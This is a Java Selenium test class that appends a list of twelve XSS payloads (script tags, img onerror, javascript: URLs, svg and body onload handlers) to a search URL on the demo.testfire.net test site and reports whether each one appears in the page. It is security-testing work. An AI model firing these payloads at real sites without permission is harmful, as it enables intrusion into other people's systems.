package UI;

import org.openqa.selenium.WebDriver;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;

import io.github.bonigarcia.wdm.WebDriverManager;

public class DOMXssTest {

	// Browser to use for testing (Chrome by default, can be Edge).
	public static String browser = "Chrome";

	// WebDriver instance to control the browser.
	public static WebDriver driver;

	// Sets up and initializes the chosen web browser.
	public static void setUpDriver() {
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize();
	}

	// Pauses execution for a specified number of seconds.
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
			Thread.currentThread().interrupt();
		}
	}

	public static void main(String[] args) {
		// Initialize the browser.
		setUpDriver();

		// Array of XSS payloads to test.
		String[] xssPayloads = {
				// Basic script injection
				"<script>alert('XSS-1')</script>", "<SCRIPT>alert('XSS-2')</SCRIPT>",
				"%3Cscript%3Ealert('XSS-3')%3C/script%3E",

				// Image error events
				"<img src=x onerror=alert('XSS-4')>", "<img src=x onmouseover=alert('XSS-5')>",

				// JavaScript URL schemes
				"<a href=\"javascript:alert('XSS-6')\">Click Me</a>",
				"<iframe src=\"javascript:alert('XSS-7')\"></iframe>",

				// HTML entity encoding
				"&lt;script&gt;alert('XSS-8')&lt;/script&gt;",

				// Various tags and event handlers
				"<svg/onload=alert('XSS-9')>", "<body onload=alert('XSS-10')>",
				"<div oncontextmenu=\"alert('XSS-11')\">Right Click Me</div>",
				"<script>alert(document.domain)</script>" };

		// Base URL for the DOM-based XSS test.
		String baseUrl = "https://demo.testfire.net/search.jsp#name=";

		System.out.println("🧪 Starting DOM-based XSS test with multiple payloads.");

		// Loop through each payload and execute the test.
		for (int i = 0; i < xssPayloads.length; i++) {
			String currentPayload = xssPayloads[i];
			String testUrl = baseUrl + currentPayload;

			driver.get(testUrl);
			System.out.println("\n--- Attempt #" + (i + 1) + " with payload: " + currentPayload + " ---");

			pause(3);

			// Check if the payload or its effect is present in the page's HTML.
			try {
				JavascriptExecutor js = (JavascriptExecutor) driver;
				String bodyContent = (String) js.executeScript("return document.body.innerHTML;");

				if (bodyContent.contains("alert('XSS") || bodyContent.contains("onerror")
						|| bodyContent.contains("onmouseover") || bodyContent.contains("oncontextmenu")
						|| bodyContent.contains("javascript:")) {
					System.out.println("🚨 DOM XSS detected! Payload or its effect appeared in the page!");
				} else {
					System.out.println("✅ No DOM XSS effect found for this payload.");
				}
			} catch (Exception e) {
				System.out.println(
						"❌ Error while checking the page for payload: " + currentPayload + " - " + e.getMessage());
			}
		}

		pause(3);
		driver.quit();
		System.out.println("\n🔚 All DOM-based XSS tests completed.");
	}
}
